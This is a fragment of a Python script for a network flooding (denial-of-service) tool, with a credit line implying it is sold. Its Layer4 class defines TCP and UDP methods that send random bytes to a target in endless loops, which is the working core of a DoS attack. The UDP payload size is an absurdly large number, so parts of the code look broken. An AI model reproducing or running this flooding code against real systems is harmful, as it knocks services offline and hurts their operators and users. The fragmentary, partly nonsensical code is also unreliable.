#!/usr/bin/env python3
#DO NOT REMOVE CREDIT FALCON UNLESS THOSE WHO BUY THIS TOOL AND DO NOT SHARE
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(739922)):
                continue
        Tools.safe_close(s)
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(39292844030029293383829294847474737282), self._target):
                continue
        Tools.safe_close(s)
